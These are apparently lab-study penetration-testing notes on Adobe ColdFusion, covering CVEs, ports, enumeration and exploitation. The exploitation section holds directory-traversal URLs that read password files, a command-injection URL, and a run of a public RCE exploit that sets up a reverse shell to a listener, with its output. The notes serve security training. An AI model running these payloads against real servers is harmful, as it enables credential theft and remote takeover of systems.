# Cold Fusion
## info
ColdFusion is a programming language and a web application development platform based on Java.  
ColdFusion Markup Language (CFML) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML, making it easy to learn for web developers. CFML includes tags and functions for database integration, web services, email management, and other common web development tasks.  
Thanks to its built-in functions and features, CFML enables developers to create complex business logic using minimal code. Moreover, ColdFusion supports other programming languages, such as JavaScript and Java, allowing developers to use their preferred programming language within the ColdFusion environment.  
## common vulnerabilities
* CVE-2021-21087: Arbitrary disallow of uploading JSP source code
* CVE-2020-24453: Active Directory integration misconfiguration
* CVE-2020-24450: Command injection vulnerability
* CVE-2020-24449: Arbitrary file reading vulnerability
* CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability
## ports
<pre>
Port  Number Protocol  Description  
80    HTTP	           Used for non-secure HTTP communication between the web server and web browser.  
443   HTTPS	           Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.  
1935  RPC	             Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.  
25    SMTP	           Simple Mail Transfer Protocol (SMTP) is used for sending email messages.  
8500  SSL	             Used for server communication via Secure Socket Layer (SSL).  
5500  Server Monitor	 Used for remote administration of the ColdFusion server.  
</pre>
## enumeration (identifing ColdFusion)
* nmap scanning
* file extensions (.cfm, .cfc)
* HTTP response headers ("Server: ColdFusion" or "X-Powered-By: ColdFusion")
* error messages
* default files ("admin.cfm" or "CFIDE/administrator/index.cfm")

on port 8500 maybe path traversal is enabled  
should do look around the files that are hosted  
## exploitation
public exploits are available in exploit-db (or use of searchsploit)  
### CVE-2010-2861 (Directory Traversal) (Adobe ColdFusion 9.0.1 and earlier versions)
vulnerable files:
* CFIDE/administrator/settings/mappings.cfm
* logging/settings.cfm
* datasources/index.cfm
* j2eepackaging/editarchive.cfm
* CFIDE/administrator/enter.cfm
poc's:
<pre>
http://example.com/index.cfm?directory=../../../etc/&file=passwd
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
</pre>
### Unauthenticated RCE example
<pre>
http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
(Url decoded): http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt
</pre>
### CVE-2009-2265 (Unauthenticated RCE) (Adobe ColdFusion versions 8.0.1 and earlier versions)
<pre>http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=</pre>
<pre>
$ searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057
</pre>
<pre>
if __name__ == '__main__':
  # Define some information
  lhost = '10.10.14.55' # HTB VPN IP
  lport = 4444 # A port not in use on localhost
  rhost = "10.129.247.30" # Target IP
  rport = 8500 # Target Port
  filename = uuid.uuid4().hex
</pre>
<pre>
$ python3 50057.py 

Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp
...
Executing the payload...
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.247.30.
Ncat: Connection from 10.129.247.30:49866.
</pre>
